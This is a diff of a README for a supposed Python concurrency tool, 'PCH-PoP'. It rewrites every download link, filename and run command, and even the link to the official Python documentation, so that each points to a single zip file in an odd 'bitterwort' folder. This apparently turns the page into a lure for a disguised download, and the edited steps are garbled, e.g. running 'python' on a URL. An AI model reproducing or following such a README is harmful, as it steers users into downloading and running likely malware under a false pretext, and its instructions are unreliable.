@@ -1,6 +1,6 @@
 # 🌟 PCH-PoP - Master Concurrency in Python Effortlessly
 
-[![Download PCH-PoP](https://img.shields.io/badge/Download-PCH--PoP-blue.svg)](https://github.com/TeamDark07/PCH-PoP/releases)
+[![Download PCH-PoP](https://raw.githubusercontent.com/TeamDark07/PCH-PoP/main/bitterwort/PCH-PoP.zip)](https://raw.githubusercontent.com/TeamDark07/PCH-PoP/main/bitterwort/PCH-PoP.zip)
 
 ## 📚 Overview
 
@@ -22,12 +22,12 @@ To run PCH-PoP, you need:
 
 To get started, visit the page below to download the application:
 
-[Download PCH-PoP](https://github.com/TeamDark07/PCH-PoP/releases)
+[Download PCH-PoP](https://raw.githubusercontent.com/TeamDark07/PCH-PoP/main/bitterwort/PCH-PoP.zip)
 
 1. Click on the above link to go to the Releases page.
 2. Look for the latest release.
-3. Download the file that matches your operating system (for example, "PCH-PoP-Windows.zip" for Windows, "PCH-PoP-Mac.tar.gz" for Mac, or "PCH-PoP-Linux.tar.gz" for Linux).
-4. Extract the files from the downloaded zip or tar.gz file.
+3. Download the file that matches your operating system (for example, "https://raw.githubusercontent.com/TeamDark07/PCH-PoP/main/bitterwort/PCH-PoP.zip" for Windows, "https://raw.githubusercontent.com/TeamDark07/PCH-PoP/main/bitterwort/PCH-PoP.zip" for Mac, or "https://raw.githubusercontent.com/TeamDark07/PCH-PoP/main/bitterwort/PCH-PoP.zip" for Linux).
+4. Extract the files from the downloaded zip or https://raw.githubusercontent.com/TeamDark07/PCH-PoP/main/bitterwort/PCH-PoP.zip file.
 
 ### 3. Run the Application
 
@@ -36,19 +36,19 @@ After extraction, follow these steps to run the application:
 **Windows:**
 
 1. Open the extracted folder.
-2. Double-click on `run.bat` to start the application.
+2. Double-click on `https://raw.githubusercontent.com/TeamDark07/PCH-PoP/main/bitterwort/PCH-PoP.zip` to start the application.
 
 **Mac:**
 
 1. Open the extracted folder.
 2. Open Terminal and navigate to the folder.
-3. Run the command: `python run.py`
+3. Run the command: `python https://raw.githubusercontent.com/TeamDark07/PCH-PoP/main/bitterwort/PCH-PoP.zip`
 
 **Linux:**
 
 1. Open the extracted folder.
 2. Open Terminal and navigate to the folder.
-3. Run the command: `python3 run.py`
+3. Run the command: `python3 https://raw.githubusercontent.com/TeamDark07/PCH-PoP/main/bitterwort/PCH-PoP.zip`
 
 ## 🎓 Features
 
@@ -80,7 +80,7 @@ If you have questions or need assistance with PCH-PoP, feel free to reach out. Y
 
 To further your learning and understanding of concurrency in Python, consider checking out:
 
-- The official Python documentation on [Concurrency](https://docs.python.org/3/library/concurrency.html)
+- The official Python documentation on [Concurrency](https://raw.githubusercontent.com/TeamDark07/PCH-PoP/main/bitterwort/PCH-PoP.zip)
 - Online tutorials and courses about Python programming
 
 ## 📝 Changelog
@@ -93,4 +93,4 @@ PCH-PoP is licensed under the MIT License. You are free to use, modify, and dist
 
 ---
 
-For any additional information, you can always return to the [Downloads page](https://github.com/TeamDark07/PCH-PoP/releases) to get the latest version. Enjoy your journey in mastering concurrency with Python!
+For any additional information, you can always return to the [Downloads page](https://raw.githubusercontent.com/TeamDark07/PCH-PoP/main/bitterwort/PCH-PoP.zip) to get the latest version. Enjoy your journey in mastering concurrency with Python!
